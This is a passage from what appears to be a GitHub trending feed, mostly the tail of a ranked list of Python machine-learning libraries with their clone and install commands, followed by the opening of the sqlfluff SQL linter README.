href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/MaxHalford/prince&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 12 · 🔀 140 · 📦 210 · 📋 110 - 35% open · ⏱️ 28.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/MaxHalford/prince&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/prince&#34;&gt;PyPi&lt;/a&gt; (📥 79K / month · 📦 5 · ⏱️ 06.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install prince&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/prince-factor-analysis&#34;&gt;Conda&lt;/a&gt; (📥 9.8K · ⏱️ 30.04.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge prince-factor-analysis&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rasbt/biopandas&#34;&gt;BioPandas&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 470) - Working with molecular structures in pandas DataFrames. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rasbt/biopandas&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 10 · 🔀 98 · 📦 100 · 📋 43 - 39% open · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rasbt/biopandas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/biopandas&#34;&gt;PyPi&lt;/a&gt; (📥 4.5K / month · 📦 14 · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install biopandas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/biopandas&#34;&gt;Conda&lt;/a&gt; (📥 110K · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge biopandas&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/minrk/findspark&#34;&gt;findspark&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 440) - Find pyspark to make it importable. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1N&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/minrk/findspark&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 15 · 🔀 67 · 📦 2.5K · 📋 23 - 52% open · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/minrk/findspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/findspark&#34;&gt;PyPi&lt;/a&gt; (📥 2.3M / month · 📦 140 · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install findspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/findspark&#34;&gt;Conda&lt;/a&gt; (📥 640K · ⏱️ 11.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge findspark&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/solegalli/feature_engine&#34;&gt;Feature Engine&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 860 · 💤) - Feature engineering package with sklearn like functionality. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/solegalli/feature_engine&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 24 · 🔀 200 · ⏱️ 06.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/solegalli/feature_engine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/feature_engine&#34;&gt;PyPi&lt;/a&gt; (📥 76K / month · 📦 66 · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install feature_engine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/feature_engine&#34;&gt;Conda&lt;/a&gt; (📥 9K · ⏱️ 05.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge feature_engine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/airbnb/streamalert&#34;&gt;StreamAlert&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 2.7K) - StreamAlert is a serverless, realtime data analysis framework.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/airbnb/streamalert&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 33 · 🔀 320 · 📋 340 - 24% open · ⏱️ 04.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/airbnb/streamalert&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ml-tooling/opyrator&#34;&gt;opyrator&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 2.6K · 💤) - Turns your machine learning code into microservices with web API,.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ml-tooling/opyrator&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 120 · 📦 36 · 📋 26 - 7% open · ⏱️ 06.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ml-tooling/opyrator&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/opyrator&#34;&gt;PyPi&lt;/a&gt; (📥 600 / month · ⏱️ 04.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install opyrator&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/opyrator&#34;&gt;Conda&lt;/a&gt; (📥 110 · ⏱️ 08.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge opyrator&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/eltonlaw/impyute&#34;&gt;impyute&lt;/a&gt;&lt;/b&gt; (🥉20 · ⭐ 320) - Data imputations library to preprocess datasets with missing data. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/eltonlaw/impyute&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 11 · 🔀 44 · 📦 140 · 📋 64 - 42% open · ⏱️ 06.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/eltonlaw/impyute&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/impyute&#34;&gt;PyPi&lt;/a&gt; (📥 5K / month · 📦 3 · ⏱️ 29.04.2019):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install impyute&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/yzhao062/SUOD&#34;&gt;SUOD&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 320) - (MLSys 21) An Acceleration System for Large-scare Unsupervised Heterogeneous.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/yzhao062/SUOD&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 1 · 🔀 41 · 📦 420 · 📋 9 - 66% open · ⏱️ 11.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/yzhao062/SUOD&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/suod&#34;&gt;PyPi&lt;/a&gt; (📥 27K / month · ⏱️ 01.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install suod&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pykale/pykale&#34;&gt;pykale&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 340) - Knowledge-Aware machine LEarning (KALE): accessible machine learning.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pykale/pykale&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 17 · 🔀 45 · 📋 98 - 14% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pykale/pykale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pykale&#34;&gt;PyPi&lt;/a&gt; (📥 56 / month · ⏱️ 12.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pykale&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jmschrei/apricot&#34;&gt;apricot&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 420) - apricot implements submodular optimization for the purpose of selecting.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jmschrei/apricot&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 4 · 🔀 40 · 📥 10 · 📦 25 · 📋 24 - 25% open · ⏱️ 18.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jmschrei/apricot&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/apricot-select&#34;&gt;PyPi&lt;/a&gt; (📥 390 / month · 📦 3 · ⏱️ 28.09.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install apricot-select&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SforAiDl/KD_Lib&#34;&gt;KD-Lib&lt;/a&gt;&lt;/b&gt; (🥉17 · ⭐ 390) - A Pytorch Knowledge Distillation library for benchmarking and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/SforAiDl/KD_Lib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 6 · 🔀 34 · 📋 59 - 22% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/SforAiDl/KD_Lib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/KD-Lib&#34;&gt;PyPi&lt;/a&gt; (📥 120 / month · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install KD-Lib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 17 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/explosion/cython-blis&#34;&gt;Cython BLIS&lt;/a&gt;&lt;/b&gt; (🥈30 · ⭐ 190) - Fast matrix-multiplication as a self-contained Python library no.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/deepmind/pysc2&#34;&gt;pysc2&lt;/a&gt;&lt;/b&gt; (🥈28 · ⭐ 7.5K · 💀) - StarCraft II Learning Environment. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/JustGlowing/minisom&#34;&gt;minisom&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 1.1K) - MiniSom is a minimalistic implementation of the Self Organizing.. &lt;code&gt;&lt;a href=&#34;https://tldrlegal.com/search?q=CC-BY-3.0&#34;&gt;❗️CC-BY-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/annoviko/pyclustering&#34;&gt;pyclustering&lt;/a&gt;&lt;/b&gt; (🥉27 · ⭐ 960 · 💀) - pyclustring is a Python, C++ data mining library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cleanlab/cleanlab&#34;&gt;cleanlab&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 3.4K) - The standard data-centric AI package for data quality and machine.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3pwmjO5&#34;&gt;❗️AGPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/modAL-python/modAL&#34;&gt;modAL&lt;/a&gt;&lt;/b&gt; (🥉24 · ⭐ 1.7K · 💀) - A modular active learning framework for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Project-MONAI/MONAILabel&#34;&gt;MONAILabel&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 240) - MONAI Label is an intelligent open source image labeling and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vecxoz/vecstack&#34;&gt;vecstack&lt;/a&gt;&lt;/b&gt; (🥉22 · ⭐ 660 · 💀) - Python package for stacking (machine learning technique). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/flennerhag/mlens&#34;&gt;mlens&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 740 · 💀) - ML-Ensemble high performance ensemble learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kLabUM/rrcf&#34;&gt;rrcf&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 380 · 💀) - Implementation of the Robust Random Cut Forest algorithm for anomaly.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/EpistasisLab/scikit-rebate&#34;&gt;scikit-rebate&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 360 · 💀) - A scikit-learn-compatible Python implementation of.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/alegonz/baikal&#34;&gt;baikal&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 590 · 💀) - A graph-based functional API for building complex scikit-learn.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pandas-ml/pandas-ml&#34;&gt;pandas-ml&lt;/a&gt;&lt;/b&gt; (🥉18 · ⭐ 290 · 💀) - pandas, scikit-learn, xgboost and seaborn integration. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/NeuralCompression&#34;&gt;NeuralCompression&lt;/a&gt;&lt;/b&gt; (🥉14 · ⭐ 250) - A collection of tools for neural compression enthusiasts. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jrieke/traingenerator&#34;&gt;traingenerator&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 1.2K · 💀) - A web app to generate template code for machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/dstackai/dstack&#34;&gt;dstack&lt;/a&gt;&lt;/b&gt; (🥉13 · ⭐ 44 · 🐣) - dstack: continuous training in the cloud. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/Palashio/nylon&#34;&gt;nylon&lt;/a&gt;&lt;/b&gt; (🥉12 · ⭐ 77 · 💤) - An intelligent, flexible grammar of machine learning. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Related Resources&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://paperswithcode.com&#34;&gt;&lt;strong&gt;Papers With Code&lt;/strong&gt;&lt;/a&gt;: Discover ML papers, code, and evaluation tables.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://sotabench.com&#34;&gt;&lt;strong&gt;Sotabench&lt;/strong&gt;&lt;/a&gt;: Discover &amp;amp; compare open-source ML models.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://toolbox.google.com/datasetsearch&#34;&gt;&lt;strong&gt;Google Dataset Search&lt;/strong&gt;&lt;/a&gt;: Dataset search engine by Google.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.datasetlist.com/&#34;&gt;&lt;strong&gt;Dataset List&lt;/strong&gt;&lt;/a&gt;: List of the biggest ML datasets from across the web.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/awesomedata/awesome-public-datasets&#34;&gt;&lt;strong&gt;Awesome Public Datasets&lt;/strong&gt;&lt;/a&gt;: A topic-centric list of open datasets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://best-of.org&#34;&gt;&lt;strong&gt;Best-of lists&lt;/strong&gt;&lt;/a&gt;: Discover other best-of lists with awesome open-source projects on all kinds of topics.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ml-tooling/best-of-python-dev&#34;&gt;&lt;strong&gt;best-of-python-dev&lt;/strong&gt;&lt;/a&gt;: A ranked list of awesome python developer tools and libraries.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ml-tooling/best-of-web-python&#34;&gt;&lt;strong&gt;best-of-web-python&lt;/strong&gt;&lt;/a&gt;: A ranked list of awesome python libraries for web development.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contribution&lt;/h2&gt; &#xA;&lt;p&gt;Contributions are encouraged and always welcome! If you like to add or update projects, choose one of the following ways:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Open an issue by selecting one of the provided categories from the &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/issues/new/choose&#34;&gt;issue page&lt;/a&gt; and fill in the requested information.&lt;/li&gt; &#xA; &lt;li&gt;Modify the &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/raw/main/projects.yaml&#34;&gt;projects.yaml&lt;/a&gt; with your additions or changes, and submit a pull request. This can also be done directly via the &lt;a href=&#34;https://github.com/ml-tooling/best-of-ml-python/edit/main/projects.yaml&#34;&gt;Github UI&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you like to contribute to or share suggestions regarding the project metadata col&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>sqlfluff/sqlfluff</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/sqlfluff/sqlfluff</id>
    <link href="https://github.com/sqlfluff/sqlfluff" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A SQL linter and auto-formatter for Humans&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/sqlfluff/sqlfluff/main/images/sqlfluff-wide.png&#34; alt=&#34;SQLFluff&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;The SQL Linter for Humans&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://pypi.org/project/sqlfluff/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/v/sqlfluff.svg?style=flat-square&amp;amp;logo=PyPi&#34; alt=&#34;PyPi Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/sqlfluff/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/l/sqlfluff.svg?style=flat-square&#34; alt=&#34;PyPi License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/sqlfluff/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/pyversions/sqlfluff.svg?style=flat-square&#34; alt=&#34;PyPi Python Versions&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/sqlfluff/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/status/sqlfluff.svg?style=flat-square&#34; alt=&#34;PyPi Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/sqlfluff/&#34;&gt;&lt;img src=&#34;https://img.shields.io/pypi/dm/sqlfluff?style=flat-square&#34; alt=&#34;PyPi Downloads&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://codecov.io/gh/sqlfluff/sqlfluff&#34;&gt;&lt;img src=&#34;https://img.shields.io/codecov/c/gh/sqlfluff/sqlfluff.svg?style=flat-square&amp;amp;logo=Codecov&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/sqlfluff/sqlfluff/actions?query=workflow%3A%22CI+Tests%22&#34;&gt;&lt;img src=&#34;https://github.com/sqlfluff/sqlfluff/workflows/CI%20Tests/badge.svg?sanitize=true&#34; alt=&#34;CI Tests&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://sqlfluff.readthedocs.io&#34;&gt;&lt;img src=&#34;https://img.shields.io/readthedocs/sqlfluff?style=flat-square&amp;amp;logo=Read%20the%20Docs&#34; alt=&#34;ReadTheDocs&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/psf/black&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/code%20style-black-000000.svg?style=flat-square&#34; alt=&#34;Code style: black&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLFluff&lt;/strong&gt; is a dialect-flexible and configurable SQL linter. Designed with ELT applications in mind, &lt;strong&gt;SQLFluff&lt;/strong&gt; also works with Jinja templating and dbt. &lt;strong&gt;SQLFluff&lt;/strong&gt; will auto-fix most linting errors, allowing you to focus your time on what matters.&lt;/p&gt; &#xA;&lt;h2&gt;Dialects Supported&lt;/h2&gt; 